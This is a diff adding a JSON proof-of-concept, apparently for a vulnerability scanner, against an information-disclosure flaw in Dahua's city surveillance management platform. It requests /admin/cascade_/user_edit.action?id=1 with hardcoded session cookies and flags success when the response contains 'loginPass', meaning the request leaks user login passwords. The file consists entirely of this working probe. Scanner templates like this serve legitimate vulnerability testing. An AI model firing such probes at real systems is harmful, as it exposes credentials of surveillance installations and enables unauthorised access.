@@ -1,0 +1,21 @@
+{
+	"name":"大华城市安防监控系统平台管理user_edit信息泄露",
+	"tag":"dahua",
+	"type":"other",
+	"poc":{
+		"pocGet":"/admin/cascade_/user_edit.action?id=1",
+		"header":{
+			"Cookie":" JSESSIONID=62BBD37D6AD7942778952E5ECE63494B; JSESSIONID=07A0062125A8903E4C6158A0244BABCD",
+			"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+			"Cache-Control":" max-age=0",
+			"Upgrade-Insecure-Requests":" 1",
+			"Connection":" keep-alive",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+			"Host":" ",
+			"Accept-Encoding":" gzip, deflate",
+			"Accept-Language":" zh-CN,zh;q=0.9"
+		},
+		"status_code":"200",
+		"pattern":"(loginPass)"
+	}
+}
